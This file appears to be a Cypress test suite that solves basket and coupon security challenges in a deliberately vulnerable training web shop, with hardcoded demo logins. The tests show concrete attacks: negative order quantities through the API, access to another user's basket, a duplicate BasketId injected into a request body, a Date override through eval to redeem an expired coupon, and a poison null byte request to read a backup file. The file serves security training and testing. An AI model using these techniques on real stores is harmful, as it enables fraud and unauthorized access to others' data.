describe("/#/basket", () => {
  describe("as admin", () => {
    beforeEach(() => {
      cy.login({ email: "admin", password: "admin123" });
    });

    describe('challenge "negativeOrder"', () => {
      xit("should be possible to update a basket to a negative quantity via the Rest API", () => {
        cy.window().then(async () => {
          const response = await fetch(
            `${Cypress.env("baseUrl")}/api/BasketItems/1`,
            {
              method: "PUT",
              cache: "no-cache",
              headers: {
                "Content-type": "application/json",
                Authorization: `Bearer ${localStorage.getItem("token")}`,
              },
              body: JSON.stringify({ quantity: -100000 }),
            }
          );
          if (response.status === 200) {
            console.log("Success");
          }
        });
        cy.visit("/#/order-summary");

        // cy.get("mat-cell.mat-column-quantity > span").first().should("match",-100000)
        cy.get("mat-cell.mat-column-quantity > span")
          .first()
          .then(($ele) => {
            let quantity = $ele.text();
            expect(quantity).to.match(/-100000/);
          });
      });

      xit("should be possible to place an order with a negative total amount", () => {
        cy.visit("/#/order-summary");
        cy.get("#checkoutButton").click();
        cy.expectChallengeSolved({ challenge: "Payback Time" });
      });
    });

    describe('challenge "basketAccessChallenge"', () => {
      xit("should access basket with id from session storage instead of the one associated to logged-in user", () => {
        cy.window().then(() => {
          window.sessionStorage.bid = 3;
        });

        cy.visit("/#/basket");

        // TODO Verify functionally that it's not the basket of the admin
        cy.expectChallengeSolved({ challenge: "View Basket" });
      });
    });

    describe('challenge "basketManipulateChallenge"', () => {
      xit("should manipulate basket of other user instead of the one associated to logged-in user", () => {
        cy.window().then(async () => {
          await fetch(`${Cypress.env("baseUrl")}/api/BasketItems/`, {
            method: "POST",
            cache: "no-cache",
            headers: {
              "Content-type": "application/json",
              Authorization: `Bearer ${localStorage.getItem("token")}`,
            },
            body: '{ "ProductId": 14,"BasketId":"1","quantity":1,"BasketId":"2" }',
          });
        });
        cy.expectChallengeSolved({ challenge: "Manipulate Basket" });
      });
    });
  });

  describe("as jim", () => {
    beforeEach(() => {
      cy.login({ email: "jim", password: "ncc-1701" });
    });
    describe('challenge "manipulateClock"', () => {
      xit("should be possible to enter WMNSDY2019 coupon", () => {
        cy.window().then(() => {
          window.localStorage.couponPanelExpanded = false;
        });
        cy.visit("/#/payment/shop");

        // yahan bt aa rahi in the console commands
        cy.window().then((win) => {
          cy.on("uncaught:exception", (err, runnable) => {
            // Introduced to disbale the uncaught:exception we get after the eval under this as TypeError: Date.now is not a function
            return false;
          });
          win.eval(
            'event = new Date("March 08, 2019 00:00:00"); Date = function(Date){return function() {date = event; return date; }}(Date);'
          );
        });
        cy.get("#collapseCouponElement").click();

        cy.get("#coupon").type("WMNSDY2019");
        cy.get("#applyCouponButton").click();
      });

      xit("should be possible to place an order with the expired coupon", () => {
        cy.visit("/#/order-summary");
        cy.get("#checkoutButton").click();
        cy.expectChallengeSolved({ challenge: "Expired Coupon" });
      });
    });

    describe('challenge "forgedCoupon"', () => {
      xit("should be able to access file /ftp/coupons_2013.md.bak with poison null byte attack", () => {
        cy.request(`${Cypress.env("baseUrl")}/ftp/coupons_2013.md.bak%2500.md`);
      });

      xit("should be possible to add a product in the basket", () => {
        cy.window().then(async () => {
          const response = await fetch(
            `${Cypress.env("baseUrl")}/api/BasketItems/`,
            {
              method: "POST",
              cache: "no-cache",
              headers: {
                "Content-type": "application/json",
                Authorization: `Bearer ${localStorage.getItem("token")}`,
              },
              body: JSON.stringify({
                BasketId: `${sessionStorage.getItem("bid")}`,
                ProductId: 1,
                quantity: 1,
              }),
            }
          );
          if (response.status === 201) {
            console.log("Success");
          }
        });
      });

      xit("should be possible to enter a coupon that gives an 80% discount", () => {
        cy.window().then(() => {
          window.localStorage.couponPanelExpanded = false;
        });

        cy.visit("/#/payment/shop");
        cy.get("#collapseCouponElement").click();
        cy.task("GenerateCoupon", 90).then((coupon: string) => {
          cy.get("#coupon").type(coupon);
          cy.get("#applyCouponButton").click();
        });
      });

      xit("should be possible to place an order with a forged coupon", () => {
        cy.visit("/#/order-summary");
        cy.get("#checkoutButton").click();
        cy.expectChallengeSolved({ challenge: "Forged Coupon" });
      });
    });
  });
});
